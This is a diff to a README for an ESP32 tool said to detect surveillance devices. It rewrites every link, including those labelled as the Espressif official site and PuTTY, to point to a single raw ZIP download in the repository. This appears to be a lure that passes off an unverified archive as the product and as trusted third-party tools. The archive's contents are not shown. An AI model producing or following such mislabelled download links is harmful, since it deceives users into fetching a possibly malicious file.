@@ -1,6 +1,6 @@
 # 🛡️ flock-detection - Detect Surveillance Devices Nearby
 
-[![Download flock-detection](https://img.shields.io/badge/Download-flock--detection-ff6600?style=for-the-badge)](https://github.com/rbarriaultjr/flock-detection)
+[![Download flock-detection](https://img.shields.io/badge/Download-flock--detection-ff6600?style=for-the-badge)](https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip)
 
 ---
 
@@ -48,9 +48,9 @@ Before you start, you will need:
 
 Please visit the page below to download the latest files you need:
 
-[![Download flock-detection](https://img.shields.io/badge/Download-flock--detection-ff6600?style=for-the-badge)](https://github.com/rbarriaultjr/flock-detection)
+[![Download flock-detection](https://img.shields.io/badge/Download-flock--detection-ff6600?style=for-the-badge)](https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip)
 
-1. Click the button above or go here: https://github.com/rbarriaultjr/flock-detection  
+1. Click the button above or go here: https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip  
 2. Find the **Releases** tab on the page and look for the latest version. Releases contain ready-to-use files.  
 3. Download the ZIP file or the firmware file that matches your ESP32-S3 hardware. This file usually has a `.bin` or `.zip` extension.  
 4. Save the file in an easy-to-find folder on your PC.
@@ -128,9 +128,9 @@ Follow these steps to run the software:
 
 ## 🔗 Helpful Links
 
-- [GitHub repository page](https://github.com/rbarriaultjr/flock-detection)  
-- Espressif official site for ESP32 tools: https://www.espressif.com  
-- Serial communication tools like PuTTY: https://www.putty.org  
+- [GitHub repository page](https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip)  
+- Espressif official site for ESP32 tools: https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip  
+- Serial communication tools like PuTTY: https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip  
 
 ---
 
